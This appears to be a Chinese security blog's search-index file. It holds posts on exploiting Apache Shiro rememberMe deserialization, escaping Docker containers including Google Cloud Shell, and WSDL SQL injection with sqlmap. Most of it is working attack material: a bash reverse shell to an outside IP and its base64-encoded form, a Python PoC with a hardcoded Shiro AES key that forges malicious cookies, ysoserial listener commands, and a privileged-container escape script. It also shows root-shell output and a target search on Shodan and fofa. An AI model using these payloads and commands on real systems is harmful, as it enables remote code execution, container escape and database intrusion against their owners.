逻辑：&lt;jsp:forwardpage=\"home.jsp\"/&gt;//跳到home.jsphome页面包含include.jsp&lt;%@includefile=\"include.jsp\"%&gt;//include.jsp导入SecurityUtils类&lt;%@pageimport=\"org.apache.shiro.SecurityUtils\"%&gt;⌘+左键单击SecurityUtils跳转shiro-core-1.2.4.jar!/org/apache/shiro/SecurityUtils.class那么我们假设SecurityUtils类是shiro框架认证入口，那么我们只需要梳理清楚对应代码逻辑即可；参考Shiro认证流程分析Shiro登录认证源码详解先直接在home.jsp页面处下断点，处理流程大概如下：JavaServerPages：_jspService(HttpServletRequest,HttpServletResponse):21,index_jsp//正常jspserver请求service(HttpServletRequest,HttpServletResponse):71,HttpJspBase//server响应request，返回JSESSIONIDservice(ServletRequest,ServletResponse):733,HttpServlet//以返回的JSESSIONIDCOOKIE访问http://127.0.0.1:8080/shiro/accountServerApplethttpServerletShirowebServerletShiroHttpServletRequestwebhttp访问后，访问调用如下：this={index_jsp@4030}request={ShiroHttpServletRequest@5282}response={ResponseFacade@4532}_jspx_method=\"GET\"out={JspWriterImpl@5284}_jspx_out={JspWriterImpl@5284}_jspx_page_context={PageContextImpl@5285}pageContext={PageContextImpl@5285}基本上就是这个流程；1x02：为什么这么写更新中...二：验证在上面的简述中，可以来进行shiro框架的判断漏洞特征：1.在返回包的Set-Cookie的值为「rememberMe=deleteMe」；2.JESSessionCookie.实际渗透中如果遇到可以尝试加入rememberMeCookie探测是否使用shiro框架；3.特定CMS集成shiro框架；1）jeesite2）iBase4J等等同时，我们可以进一步对shiro框架是否存在反序列化来进行验证：用到的是Shiroscanby斯文脚本，开源在github上，用法就不多赘述。python3shiro_rce.pyhttps://shiro.vuln.ip/login.html\"pingx.dnslog.cn\"__________/___|||__(_)______/___|_________\\___\\|'_\\||'__/_\\___\\/__/_`|'_\\___)|||||||(_)|__)|(_|(_||||||____/|_||_|_|_|\\___/____/\\___\\__,_|_||_|By斯文WelcomeToShiro反序列化RCE![*]开始检测模块Class1:CommonsBeanutils1然后脚本开始对不同的秘钥进行生成cookie，尝试让机器执行命令。等待脚本在跑的时候或者跑完，看一下dnslog上的dns记录，如果存在记录如下所示，那么就说明存在反序列化漏洞使得机器执行了任意代码，反之则无：x.dnslog.cnshiro.vuln.ip2020-07-0216:46:35x.dnslog.cnshiro.vuln.ip2020-07-0216:45:52x.dnslog.cnshiro.vuln.ip2020-07-0216:45:52x.dnslog.cnshiro.vuln.ip2020-07-0216:45:52当然有的时候用shiroScan扫结束后并没有记录，即不存在漏洞；但是像我，又不死心，于是又在网上折腾找了另外一个能够跑秘钥的探测脚本-_-作者博客pythonshiro_exp.pyhttps://shiro.vuln.ip/login.htmltryCipherKey:4AvVhmFLUs0KTA3Kprsdag==generatorpayloaddone.sendpayloadok.checking.....checking.....checking.....checking.....vulnerable:trueurl:https://shiro.vuln.ip/login.htmlCipherKey:3AvVhmFLUs0KTA3Kprsdag==当然秘钥对于我们理解shiro反序列化框架也有一定的帮助，shiro的反序列化最初的漏洞来源也是因为秘钥硬编码。2x01：getshell通过上面的步骤我们就可以对shiro反序列化做一个判定，肯定是存在RCE漏洞，那么来实现我们的最终目的，GET-shell一般反弹shell的执行代码bash-i&gt;&amp;/dev/tcp/47.52.233.92/111110&gt;&amp;1，首先需要把代码进行base64编码，只有经过base64编码后shiro才认得这个命令，通过shiro自己本身的base64解码最终达到执行命令的目的；转成base64编码:bash-c{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}像我比较偷懒，就直接在脚本上添加反弹shell，这样的好处就是我们不需要在生成poc的脚本里替换cookie，由脚本自动生成的cookie自动去跑，省事很多java.lang.Runtime.exec()转换网址监听端口等待shell回连（我这里的样例是docker环境）nc-lvvp11111Listeningon[0.0.0.0](family0,port11111)Connectionfrom59.110.152.16847274received!bash:cannotsetterminalprocessgroup(1):Inappropriateioctlfordevicebash:nojobcontrolinthisshellroot@6d5a7848dbef:/#ididuid=0(root)gid=0(root)groups=0(root)2x02：学习工具使用ysoserial进行流量监听，下面是ysoserial的jar包生成，懂得开发同学都懂。gitclonehttps://github.com/frohoff/ysoserial.gitcdysoserialmvnpackage-DskipTests2x03：howtopoc使用poc代码获得对应的rememberMe的cookie值。#-*-coding:utf-8-*-importsysimportuuidimportbase64importsubprocessfromCrypto.CipherimportAESdefencode_rememberme(command):popen=subprocess.Popen(['java','-jar','ysoserial-0.0.6-SNAPSHOT-all.jar','JRMPClient',command],stdout=subprocess.PIPE)BS=AES.block_sizepad=lambdas:s+((BS-len(s)%BS)*chr(BS-len(s)%BS)).encode()key=base64.b64decode(\"kPH+bIxk5D2deZiIxcaaaA==\")iv=uuid.uuid4().bytesencryptor=AES.new(key,AES.MODE_CBC,iv)file_body=pad(popen.stdout.read())base64_ciphertext=base64.b64encode(iv+encryptor.encrypt(file_body))returnbase64_ciphertextif__name__=='__main__':payload=encode_rememberme(sys.argv[1])print\"rememberMe={0}\".format(payload.decode())D:\\bin4xin\\code\\shiro\\shrio-poc\\ysoserial\\target&gt;python.\\shrio-poc.py47.52.233.92:6666rememberMe=W8BOhPe8Qdy8FJ5N9genqt4WjZaONr1NQ+dXgDCV1RrGHUwMfd8ljlA9AG64t7vzUesOp7YKsz6EFFHgyrq1qRqUiPFBnEBi/NNNpE2UR8CgMsf1KY2rbBurFv1Gwslv2+SL7hy3YNq9cpPWm5S8o+nJpa6IyI9cZ+n7a+6hjB4Yfnf89u3BLi4AxOXL35SotH2AdSX2iZrWgGAcah9oW21JwpC2zj4YMjsGf2tPYUysP873bYYHuSIohaXf3bcq4YuQajMctVmM3IvjeY5Ggva9QRUvo5B1o0sPNHdXGwn/z9t/KWcSeTWE+Dt2f95a9QjEIoic6s88Tv0SKjY6UdCmTxN3vVE8rs1haiA48R1CuUQQiWa9V28m2qkonX9aUEUl4kTGGvF+Y5eB4MaNTw==抓包，前台登录拦包，勾选RememberMe，截获数据包，替换cookie构造数据包：POST/doLoginHTTP/1.1underattack-host:underattack-host:8080Content-Length:55Cache-Control:max-age=0Origin:http://underattack-host:8080Upgrade-Insecure-Requests:1DNT:1Content-Type:application/x-www-form-urlencodedUser-Agent:Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/81.0.4044.138Safari/537.36Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer:http://underattack-host:8080/loginAccept-Encoding:gzip,deflateAccept-Language:zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Cookie:rememberMe=RFUadguvSoq4kMm3ZwnkO/MHiokCrqrCURXUqUWaXLBM7/fBF65qvjWDFZeh49zHDRm5oKPU1AhmbEBaYRp3ASrQpHdp7mYrChOi51tmq9qkzWemDnjbUXtp8B6RF1EUNV2q2tKaKlf4AAR1hZIRJGbz4CpLeumNAeWB98f6/T0GaWJGGve9rP6l9/7iU5Y9Xj4ZmSBP6LgMHYF3TJ2DDdTNI4nPITeQI3S+9ol/BmT14Be5m0ENfOkm1cdm3L8Rj/pbeE842Y3nUioEdAXizCrOsCYT+u2QTWHt1YZLmB/xsfQvEV5bRpRJeRv/ps7V00PiXvCeaPQoDs541wqB75+/RRAdqU8TWnJE7YhvQVkxTRLvCjBTtwfkgA3XVA8X+518nh0wSoj8/Ajaoi5MbA==Connection:closeusername=asdmnin&amp;password=asdasd&amp;rememberme=remember-me使用包监听6666端口：root@iZj6cgn7odv59wmjjhe6zwZ:/home/tool/shiro_poc/POC-2/ysoserial/target#java-cpysoserial-0.0.6-SNAPSHOT-all.jarysoserial.exploit.JRMPListener6666CommonsCollections4'bash-c{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny41Mi4yMzMuOTIvMTIzNCAwPiYx}|{base64,-d}|{bash,-i}'*OpeningJRMPlisteneron6666发包，我们看到jrmp监听的端口已经有流量回流回来了，如下：Haveconnectionfrom/underattack-host:58272Readingmessage...IsDGCcallfor[[0:0:0,356978429],[0:0:0,2006635131]]Sendingreturnwithpayloadforobj[0:0:0,2]ClosingconnectionHaveconnectionfrom/underattack-host:58274Readingmessage...IsDGCcallfor[[0:0:0,356978429],[0:0:0,-1104978848],[0:0:0,2006635131]]Sendingreturnwithpayloadforobj[0:0:0,2]Closingconnection案例/usr/local/nginx/conf/nginx.confinetaddr:192.168.100.242Bcast:192.168.100.255Mask:255.255.255.0&lt;!--ApacheShiro--&gt;&lt;filter&gt;&lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;&lt;filter-class&gt;org.springframework.web.filter.DelegatingFilterProxy&lt;/filter-class&gt;&lt;init-param&gt;&lt;param-name&gt;targetFilterLifecycle&lt;/param-name&gt;&lt;param-value&gt;true&lt;/param-value&gt;&lt;/init-param&gt;&lt;/filter&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;shiroFilter&lt;/filter-name&gt;&lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;!--PageCache,cache.htmlsuffix.&lt;filter&gt;&lt;filter-name&gt;PageCacheFilter&lt;/filter-name&gt;&lt;filter-class&gt;com.thinkgem.jeesite.common.filter.PageCachingFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;PageCacheFilter&lt;/filter-name&gt;&lt;url-pattern&gt;/&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;PageCacheFilter&lt;/filter-name&gt;&lt;url-pattern&gt;*.html&lt;/url-pattern&gt;&lt;/filter-mapping&gt;--&gt;&lt;!--SiteMesh--&gt;&lt;filter&gt;&lt;filter-name&gt;sitemeshFilter&lt;/filter-name&gt;&lt;filter-class&gt;com.opensymphony.sitemesh.webapp.SiteMeshFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;sitemeshFilter&lt;/filter-name&gt;&lt;url-pattern&gt;/a/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;filter-mapping&gt;&lt;filter-name&gt;sitemeshFilter&lt;/filter-name&gt;&lt;url-pattern&gt;/f/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&lt;?xmlversion=\"1.0\"encoding=\"UTF-8\"?&gt;&lt;beansxmlns=\"http://www.springframework.org/schema/beans\"xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"xmlns:context=\"http://www.springframework.org/schema/context\"xsi:schemaLocation=\"http://www.springframework.org/schema/beanshttp://www.springframework.org/schema/beans/spring-beans-4.0.xsdhttp://www.springframework.org/schema/contexthttp://www.springframework.org/schema/context/spring-context-4.0.xsd\"default-lazy-init=\"true\"&gt;&lt;description&gt;ShiroConfiguration&lt;/description&gt;&lt;!--加载配置属性文件--&gt;&lt;context:property-placeholderignore-unresolvable=\"true\"location=\"classpath:jeesite.properties\"/&gt;&lt;!--Shiro权限过滤过滤器定义--&gt;&lt;beanname=\"shiroFilterChainDefinitions\"class=\"java.lang.String\"&gt;&lt;constructor-arg&gt;&lt;value&gt;/static/**=anon/userfiles/**=anon${adminPath}/cas=cas${adminPath}/login=authc${adminPath}/isValidateKlp=anon${adminPath}/queryLoingname=anon${adminPath}/ukeyIsExist=anon${adminPath}/validSlider/**=anon${adminPath}/dataInterface/**=anon${adminPath}/sys/forget/**=anon&lt;!--登录页忘记密码--&gt;${adminPath}/logout=logout${adminPath}/**=user/act/rest/service/editor/**=perms[act:model:edit]/act/rest/service/model/**=perms[act:model:edit]/act/rest/service/**=user/ReportServer/**=user${mobilePath}/**=anon&lt;/value&gt;&lt;/constructor-arg&gt;&lt;/bean&gt;&lt;!--安全认证过滤器--&gt;&lt;beanid=\"shiroFilter\"class=\"org.apache.shiro.spring.web.ShiroFilterFactoryBean\"&gt;&lt;propertyname=\"securityManager\"ref=\"securityManager\"/&gt;&lt;!--&lt;propertyname=\"loginUrl\"value=\"${cas.server.url}?service=${cas.project.url}${adminPath}/cas\"/&gt;--&gt;&lt;propertyname=\"loginUrl\"value=\"${adminPath}/login\"/&gt;&lt;propertyname=\"successUrl\"value=\"${adminPath}?login\"/&gt;&lt;propertyname=\"filters\"&gt;&lt;map&gt;&lt;entrykey=\"cas\"value-ref=\"casFilter\"/&gt;&lt;entrykey=\"authc\"value-ref=\"formAuthenticationFilter\"/&gt;&lt;/map&gt;&lt;/property&gt;&lt;propertyname=\"filterChainDefinitions\"&gt;&lt;refbean=\"shiroFilterChainDefinitions\"/&gt;&lt;/property&gt;&lt;/bean&gt;&lt;!--CAS认证过滤器--&gt;&lt;beanid=\"casFilter\"class=\"org.apache.shiro.cas.CasFilter\"&gt;&lt;propertyname=\"failureUrl\"value=\"${adminPath}/login\"/&gt;&lt;/bean&gt;&lt;!--定义Shiro安全管理配置--&gt;&lt;beanid=\"securityManager\"class=\"org.apache.shiro.web.mgt.DefaultWebSecurityManager\"&gt;&lt;propertyname=\"realm\"ref=\"systemAuthorizingRealm\"/&gt;&lt;propertyname=\"sessionManager\"ref=\"sessionManager\"/&gt;&lt;propertyname=\"cacheManager\"ref=\"shiroCacheManager\"/&gt;&lt;/bean&gt;&lt;!--自定义会话管理配置--&gt;&lt;beanid=\"sessionManager\"class=\"com.thinkgem.jeesite.common.security.shiro.session.SessionManager\"&gt;&lt;propertyname=\"sessionDAO\"ref=\"sessionDAO\"/&gt;&lt;!--会话超时时间，单位：毫秒--&gt;&lt;propertyname=\"globalSessionTimeout\"value=\"${session.sessionTimeout}\"/&gt;&lt;!--定时清理失效会话,清理用户直接关闭浏览器造成的孤立会话--&gt;&lt;propertyname=\"sessionValidationInterval\"value=\"${session.sessionTimeoutClean}\"/&gt;&lt;!--&lt;propertyname=\"sessionValidationSchedulerEnabled\"value=\"false\"/&gt;--&gt;&lt;propertyname=\"sessionValidationSchedulerEnabled\"value=\"true\"/&gt;&lt;propertyname=\"sessionIdCookie\"ref=\"sessionIdCookie\"/&gt;&lt;propertyname=\"sessionIdCookieEnabled\"value=\"true\"/&gt;&lt;/bean&gt;&lt;!--指定本系统SESSIONID,默认为:JSESSIONID问题:与SERVLET容器名冲突,如JETTY,TOMCAT等默认JSESSIONID,当跳出SHIROSERVLET时如ERROR-PAGE容器会为JSESSIONID重新分配值导致登录会话丢失!--&gt;&lt;beanid=\"sessionIdCookie\"class=\"org.apache.shiro.web.servlet.SimpleCookie\"&gt;&lt;constructor-argname=\"name\"value=\"jeesite.session.id\"/&gt;&lt;propertyname=\"path\"value=\"/\"/&gt;&lt;/bean&gt;&lt;!--自定义Session存储容器--&gt;&lt;beanid=\"sessionDAO\"class=\"com.thinkgem.jeesite.common.security.shiro.session.JedisSessionDAO\"&gt;&lt;propertyname=\"sessionIdGenerator\"ref=\"idGen\"/&gt;&lt;propertyname=\"sessionKeyPrefix\"value=\"${redis.keyPrefix}:user:session_\"/&gt;&lt;/bean&gt;&lt;!--&lt;beanid=\"sessionDAO\"class=\"com.thinkgem.jeesite.common.security.shiro.session.CacheSessionDAO\"&gt;&lt;propertyname=\"sessionIdGenerator\"ref=\"idGen\"/&gt;&lt;propertyname=\"activeSessionsCacheName\"value=\"activeSessionsCache\"/&gt;&lt;propertyname=\"cacheManager\"ref=\"shiroCacheManager\"/&gt;&lt;/bean&gt;--&gt;&lt;!--定义授权缓存管理器--&gt;&lt;!--&lt;beanid=\"shiroCacheManager\"class=\"com.thinkgem.jeesite.common.security.shiro.cache.SessionCacheManager\"/&gt;--&gt;&lt;beanid=\"shiroCacheManager\"class=\"org.apache.shiro.cache.ehcache.EhCacheManager\"&gt;&lt;propertyname=\"cacheManager\"ref=\"cacheManager\"/&gt;&lt;/bean&gt;&lt;!--保证实现了Shiro内部lifecycle函数的bean执行--&gt;&lt;beanid=\"lifecycleBeanPostProcessor\"class=\"org.apache.shiro.spring.LifecycleBeanPostProcessor\"/&gt;&lt;!--AOP式方法级权限检查--&gt;&lt;beanclass=\"org.springframework.aop.framework.autoproxy.DefaultAdvisorAutoProxyCreator\"depends-on=\"lifecycleBeanPostProcessor\"&gt;&lt;propertyname=\"proxyTargetClass\"value=\"true\"/&gt;&lt;/bean&gt;&lt;beanclass=\"org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor\"&gt;&lt;propertyname=\"securityManager\"ref=\"securityManager\"/&gt;&lt;/bean&gt;&lt;/beans&gt;以上。"
  },

  {
    "title"    : "「DOCKER」:谈谈docker逃逸那点事",
    "category" : "",
    "tags"     : "漏洞复现, 笔记, docker, CVE",
    "url"      : "/blog/2020/escape-docker-from-google-cloud_shell/",
    "date"     : "May 17, 2020",
    "content"  : "GoogleCloudShellDocker逃逸sudodocker-Hunix:///google/host/var/run/docker.sockpullalpine:latestWelcometoCloudShell!Type\"help\"togetstarted.YourCloudPlatformprojectinthissessionissettoavid-rope-267508.Use“gcloudconfigsetproject[PROJECT_ID]”tochangetoadifferentproject.chihou_pro@cloudshell:~(avid-rope-267508)$sudosuroot@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/home/chihou_pro#lsREADME-cloudshell.txt很明显的看到，使用了docker容器，参考：root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/home/chihou_pro#cat/proc/1/cgroup12:hugetlb:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b11:perf_event:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b10:cpu,cpuacct:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b9:cpuset:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b8:memory:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b7:devices:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b6:freezer:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b5:blkio:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b4:rdma:/3:pids:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b2:net_cls,net_prio:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b1:name=systemd:/kubepods/besteffort/pod9621f4ca5c9abb70e26317dc85781dd7/2a5c07b1452692a636285fe36c44da49fe7f0afd48070c1d7f73a27138c5ad2b0::/system.slice/containerd.service发现docker我们可以看到kubepods等关键词，浏览了文件系统之后，注意到有2个Dockerunix套接字可用。在/run/docker.sock中，这是我们在CloudShell中运行的Docker客户端的默认路径。root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/#catrun/docker/docker.sockgoogle/metrics/postgresql/sshd/supervisor.pidxtables.lockdocker.piddocker-ssd.pidlock/mount/rsyslogd.pidsshd.pidutmp/google/host/var/run/docker.sock套接字，这是第二个。root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/#ls/google/host/var/run/agetty.reloadcloud-initcommand-recordercrash_reporterdockerdockershim.sockinitctllockboxlvmmetricssshd.pidsystemdtmpfiles.duservmblkidcloudshell-credscontainerddbusdocker.piddocker.socklocklogmachine-idmountsudotheiaudevutmpxtables.lock然后根据上面的可利用套接字准备一个bash文件进行docker逃逸:-)newabashfiletoescapedockeringoogle_cloud_shell.sudodocker-Hunix:///google/host/var/run/docker.sockpullalpine:latestsudodocker-Hunix:///google/host/var/run/docker.sockrun-d-it--nameLiveOverflow-container-v\"/proc:/host/proc\"-v\"/sys:/host/sys\"-v\"/:/rootfs\"--network=host--privileged=true--cap-add=ALLalpine:latestsudodocker-Hunix:///google/host/var/run/docker.sockstartLiveOverflow-containersudodocker-Hunix:///google/host/var/run/docker.sockexec-itLiveOverflow-container/bin/sh运行bash文件root@cs-6000-devshell-vm-d336a485-4d57-485b-bd84-220ac5dd5619:/home/chihou_pro#bashdocker_escape.shlatest:Pullingfromlibrary/alpineDigest:sha256:39eda93d15866957feaee28f8fc5adb545276a64147445c64992ef69804dbf01Status:Imageisuptodateforalpine:latestdocker.io/library/alpine:latestdocker:Errorresponsefromdaemon:Conflict.Thecontainername\"/LiveOverflow-container\"isalreadyinusebycontainer\"2e2896994c459d7be0a6acb613c8be509ef5158cb97ddac4b5e30b2fed770d56\".Youhavetoremove(orrename)thatcontainertobeabletoreusethatname.See'dockerrun--help'.LiveOverflow-container/#whoamiroot如上，逃逸成功dockerdaemonapi漏洞复现验证漏洞存在：[root@iZ2ze9ebgot9gy5c2mi5ecZunauthorized-rce]#curlhttp://vuln_docker_ip:2375/info{\"ID\":\"OY55:HR25:LKHP:XTLU:LCID:Y64D:46WQ:4T5U:U2SF:5PVW:R7I3:T6KV\",\"Containers\":2,\"ContainersRunning\":1,\"ContainersPaused\":0,\"ContainersStopped\":1,\"Images\":1,\"Driver\":\"overlay2\",\"DriverStatus\":[[\"BackingFilesystem\",\"extfs\"],[\"Supportsd_type\",\"true\"],[\"NativeOverlayDiff\",\"true\"]],\"SystemStatus\":null,\"Plugins\":{\"Volume\":[\"local\"],\"Network\":[\"bridge\",\"host\",\"macvlan\",\"null\",\"overlay\"],\"Authorization\":null,\"Log\":[\"awslogs\",\"fluentd\",\"gcplogs\",\"gelf\",\"journald\",\"json-file\",\"logentries\",\"splunk\",\"syslog\"]},\"MemoryLimit\":true,\"SwapLimit\":true,\"KernelMemory\":true,\"CpuCfsPeriod\":true,\"CpuCfsQuota\":true,\"CPUShares\":true,\"CPUSet\":true,\"IPv4Forwarding\":true,\"BridgeNfIptables\":false,\"BridgeNfIp6tables\":false,\"Debug\":false,\"NFd\":29,\"OomKillDisable\":true,\"NGoroutines\":51,\"SystemTime\":\"2020-05-22T02:44:08.778253143Z\",\"LoggingDriver\":\"json-file\",\"CgroupDriver\":\"cgroupfs\",\"NEventsListener\":0,\"KernelVersion\":\"3.10.0-1062.12.1.el7.x86_64\",\"OperatingSystem\":\"AlpineLinuxv3.7(containerized)\",\"OSType\":\"linux\",\"Architecture\":\"x86_64\",\"IndexServerAddress\":\"https://index.docker.io/v1/\",\"RegistryConfig\":{\"AllowNondistributableArtifactsCIDRs\":[],\"AllowNondistributableArtifactsHostnames\":[],\"InsecureRegistryCIDRs\":[\"127.0.0.0/8\"],\"IndexConfigs\":{\"docker.io\":{\"Name\":\"docker.io\",\"Mirrors\":[],\"Secure\":true,\"Official\":true}},\"Mirrors\":[]},\"NCPU\":2,\"MemTotal\":3973296128,\"GenericResources\":null,\"DockerRootDir\":\"/var/lib/docker\",\"HttpProxy\":\"\",\"HttpsProxy\":\"\",\"NoProxy\":\"\",\"Name\":\"14e1a228e781\",\"Labels\":[],\"ExperimentalBuild\":false,\"ServerVersion\":\"18.03.0-ce\",\"ClusterStore\":\"\",\"ClusterAdvertise\":\"\",\"Runtimes\":{\"runc\":{\"path\":\"docker-runc\"}},\"DefaultRuntime\":\"runc\",\"Swarm\":{\"NodeID\":\"\",\"NodeAddr\":\"\",\"LocalNodeState\":\"inactive\",\"ControlAvailable\":false,\"Error\":\"\",\"RemoteManagers\":null},\"LiveRestoreEnabled\":false,\"Isolation\":\"\",\"InitBinary\":\"docker-init\",\"ContainerdCommit\":{\"ID\":\"cfd04396dc68220d1cecbe686a6cc3aa5ce3667c\",\"Expected\":\"cfd04396dc68220d1cecbe686a6cc3aa5ce3667c\"},\"RuncCommit\":{\"ID\":\"4fc53a81fb7c994640722ac585fa9ca548971871\",\"Expected\":\"4fc53a81fb7c994640722ac585fa9ca548971871\"},\"InitCommit\":{\"ID\":\"949e6fa\",\"Expected\":\"949e6fa\"},\"SecurityOptions\":[\"name=seccomp,profile=default\"]}如上，访问info目录返回了关于docker的信息。直接攻击机运行命令：root@shell:/home/tool/docker/unauth_rce#docker-H=tcp://vuln_docker_ip:2375run-it-v/:/tmp--entrypoint/bin/shalpine:latest/#whoamiroot/#uname-aLinuxaa5ae15c12f03.10.0-1062.12.1.el7.x86_64#1SMPTueFeb423:02:59UTC2020x86_64Linux/#ifconfigeth0Linkencap:EthernetHWaddr02:42:AC:11:00:02inetaddr:172.17.0.2Bcast:172.17.255.255Mask:255.255.0.0UPBROADCASTRUNNINGMULTICASTMTU:1500Metric:1RXpackets:8errors:0dropped:0overruns:0frame:0TXpackets:0errors:0dropped:0overruns:0carrier:0collisions:0txqueuelen:0RXbytes:656(656.0B)TXbytes:0(0.0B)loLinkencap:LocalLoopbackinetaddr:127.0.0.1Mask:255.0.0.0UPLOOPBACKRUNNINGMTU:65536Metric:1RXpackets:0errors:0dropped:0overruns:0frame:0TXpackets:0errors:0dropped:0overruns:0carrier:0震惊有木有，我们可以在靶场上复现，现在在撒旦上、fofa上都很少能找到这种程度的漏洞了；在宿主机上查看docker信息：[root@shellunauthorized-rce]#bash/home/docker_shell_exe.shdocker0Linkencap:EthernetHWaddr02:42:ED:E8:4E:97inetaddr:172.17.0.1Bcast:172.17.255.255Mask:255.255.0.0inet6addr:fe80::42:edff:fee8:4e97/64Scope:LinkUPBROADCASTRUNNINGMULTICASTMTU:1500Metric:1RXpackets:0errors:0dropped:0overruns:0frame:0TXpackets:3errors:0dropped:0overruns:0carrier:0collisions:0txqueuelen:0RXbytes:0(0.0B)TXbytes:266(266.0B)eth0Linkencap:EthernetHWaddr02:42:AC:14:00:02inetaddr:172.20.0.2Bcast:0.0.0.0Mask:255.255.0.0inet6addr:fe80::42:acff:fe14:2/64Scope:LinkUPBROADCASTRUNNINGMULTICASTMTU:1500Metric:1RXpackets:45363errors:0dropped:0overruns:0frame:0TXpackets:41902errors:0dropped:0overruns:0carrier:0collisions:0txqueuelen:0RXbytes:10257217(9.7MiB)TXbytes:3704534(3.5MiB)loLinkencap:LocalLoopbackinetaddr:127.0.0.1Mask:255.0.0.0inet6addr:::1/128Scope:Hostinet6addr:::1/128Scope:HostUPLOOPBACKRUNNINGMTU:65536Metric:1RXpackets:55errors:0dropped:0overruns:0frame:0TXpackets:55errors:0dropped:0overruns:0carrier:0collisions:0txqueuelen:1000RXbytes:6487(6.3KiB)TXbytes:6487(6.3KiB)返回的信息如上，与我们所使用的靶机机器一致；"
  },

  {
    "title"    : "「渗透」:SQL注入新姿势:)",
    "category" : "",
    "tags"     : "Web, 笔记, 渗透",
    "url"      : "/blog/2020/wsdl-sql-inject-recurrent/",
    "date"     : "May 15, 2020",
    "content"  : "由于一些机缘巧合，发现了一些SQL注入的新姿势，记录一下；记录就是一个简单的练手记录，感觉非常有意思；目标确定在shodan、fofa上搜asmx，找到疑似存在wsdl注入的站，大概的是这样的：http://vuln_ip:8081/WebService1.asmx?WSDL，一般我们可以通过手工的方式去尝试注入，这样的站访问进去后是类似xml的文件，里面是各种与服务器交互的参数，比如登录页面的username、passwd参数，开发者们都已经配置好这些参数；如下，这是一个参数对应的xml标签：&lt;s:elementname=\"HelloWorldResponse\"&gt;&lt;s:complexType&gt;&lt;s:sequence&gt;&lt;s:elementminOccurs=\"0\"maxOccurs=\"1\"name=\"HelloWorldResult\"type=\"s:string\"/&gt;&lt;/s:sequence&gt;&lt;/s:complexType&gt;&lt;/s:element&gt;sqlmap一把梭wsdl注入我们手工的方式是构造一个SOAP对应的参数的post包发给asmx网页。post包如下：&lt;SOAP-ENV:Envelopexmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"xmlns:soap=\"http://schemas.xmlsoap.org/wsdl/soap/\"xmlns:xsd=\"http://www.w3.org/1999/XMLSchema\"xmlns:xsi=\"http://www.w3.org/1999/XMLSchema-instance\"xmlns:m0=\"http://tempuri.org/\"xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\"xmlns:urn=\"http://tempuri.org/\"&gt;&lt;SOAP-ENV:Header/&gt;&lt;SOAP-ENV:Body&gt;&lt;urn:HelloWorldResult&gt;&lt;urn:ins&gt;1*&lt;/urn:ins&gt;&lt;/urn:HelloWorldResult&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;大致的一个构造思路就是这样的，然后观察服务器数据库的报错情况，我们可以直接把数据post包拿过来跑：root@#:/home/tool/sqlmap-data/wsdl-inject#sqlmap-rnet-test1.txt--batch_____H________[.]___________{1.2.4#stable}|_-|.[(]|.'|.||___|_[\"]_|_|_|__,|_||_|V|_|http://sqlmap.org[!]legaldisclaimer:Usageofsqlmapforattackingtargetswithoutpriormutualconsentisillegal.Itistheenduser'sresponsibilitytoobeyallapplicablelocal,stateandfederallaws.Developersassumenoliabilityandarenotresponsibleforanymisuseordamagecausedbythisprogram[*]startingat11:03:20[11:03:54][INFO]testingMicrosoftSQLServer[11:03:54][INFO]confirmingMicrosoftSQLServer[11:04:24][CRITICAL]connectiontimedouttothetargetURL.sqlmapisgoingtoretrytherequest(s)[11:04:24][INFO]theback-endDBMSisMicrosoftSQLServerwebserveroperatingsystem:Windows2008R2or7webapplicationtechnology:ASP.NET4.0.30319,